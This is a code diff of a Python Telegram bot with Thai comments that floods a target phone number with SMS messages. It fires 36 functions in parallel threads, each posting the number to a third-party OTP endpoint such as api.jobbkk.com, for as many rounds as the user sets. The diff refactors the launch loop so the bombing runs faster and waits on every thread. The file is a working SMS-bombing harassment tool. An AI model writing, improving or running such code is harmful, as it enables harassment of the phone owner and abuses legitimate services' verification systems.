@@ -22,7 +22,6 @@ def api1(phone):
     except Exception as e:
         logging.error(f"Error in API 1: {e}")
 
-# เพิ่มฟังก์ชัน API อื่น ๆ (api2 ถึง api36)
 def api2(phone):
     try:
         requests.Session().post("https://api.jobbkk.com/v1/easy/otp_code",
@@ -311,45 +310,23 @@ def api36(phone):
     except Exception as e:
         logging.error(f"Error in API 36: {e}")
 
-# ฟังก์ชันที่ยิง SMS ทุกๆ จำนวนรอบที่กำหนด
+# ฟังก์ชันที่ยิง SMS แบบรัวๆ ตามจำนวนรอบที่กำหนด
 def send_sms(phone, rounds):
     for _ in range(rounds):
-        threading.Thread(target=api1, args=(phone,)).start()
-        threading.Thread(target=api2, args=(phone,)).start()
-        threading.Thread(target=api3, args=(phone,)).start()
-        threading.Thread(target=api4, args=(phone,)).start()
-        threading.Thread(target=api5, args=(phone,)).start()
-        threading.Thread(target=api6, args=(phone,)).start()
-        threading.Thread(target=api7, args=(phone,)).start()
-        threading.Thread(target=api8, args=(phone,)).start()
-        threading.Thread(target=api9, args=(phone,)).start()
-        threading.Thread(target=api10, args=(phone,)).start()
-        threading.Thread(target=api11, args=(phone,)).start()
-        threading.Thread(target=api12, args=(phone,)).start()
-        threading.Thread(target=api13, args=(phone,)).start()
-        threading.Thread(target=api14, args=(phone,)).start()
-        threading.Thread(target=api15, args=(phone,)).start()
-        threading.Thread(target=api16, args=(phone,)).start()
-        threading.Thread(target=api17, args=(phone,)).start()
-        threading.Thread(target=api18, args=(phone,)).start()
-        threading.Thread(target=api19, args=(phone,)).start()
-        threading.Thread(target=api20, args=(phone,)).start()
-        threading.Thread(target=api21, args=(phone,)).start()
-        threading.Thread(target=api22, args=(phone,)).start()
-        threading.Thread(target=api23, args=(phone,)).start()
-        threading.Thread(target=api24, args=(phone,)).start()
-        threading.Thread(target=api25, args=(phone,)).start()
-        threading.Thread(target=api26, args=(phone,)).start()
-        threading.Thread(target=api27, args=(phone,)).start()
-        threading.Thread(target=api28, args=(phone,)).start()
-        threading.Thread(target=api29, args=(phone,)).start()
-        threading.Thread(target=api30, args=(phone,)).start()
-        threading.Thread(target=api31, args=(phone,)).start()
-        threading.Thread(target=api32, args=(phone,)).start()
-        threading.Thread(target=api33, args=(phone,)).start()
-        threading.Thread(target=api34, args=(phone,)).start()
-        threading.Thread(target=api35, args=(phone,)).start()
-        threading.Thread(target=api36, args=(phone,)).start()
+        # ยิงทั้งหมด 36 API
+        threads = []
+        for api in [api1, api2, api3, api4, api5, api6, api7, api8, api9, api10,
+                    api11, api12, api13, api14, api15, api16, api17, api18,
+                    api19, api20, api21, api22, api23, api24, api25, api26,
+                    api27, api28, api29, api30, api31, api32, api33, api34,
+                    api35, api36]:
+            thread = threading.Thread(target=api, args=(phone,))
+            threads.append(thread)
+            thread.start()
+
+        # รอให้ทุก thread ทำงานเสร็จ
+        for thread in threads:
+            thread.join()
 
 # ฟังก์ชันจัดการคำสั่ง /sms
 def sms_command(update: Update, context: CallbackContext):
@@ -369,7 +346,7 @@ def sms_command(update: Update, context: CallbackContext):
 
     update.message.reply_text(f'เริ่มยิง SMS ไปยัง {phone} จำนวน {rounds} รอบ')
 
-    # เริ่มยิง SMS ต่อเนื่อง
+    # เริ่มยิง SMS
     threading.Thread(target=send_sms, args=(phone, rounds)).start()
 
 # ฟังก์ชันหลักสำหรับบอท
@@ -386,4 +363,4 @@ def main():
 
 if __name__ == '__main__':
     main()
-    
+
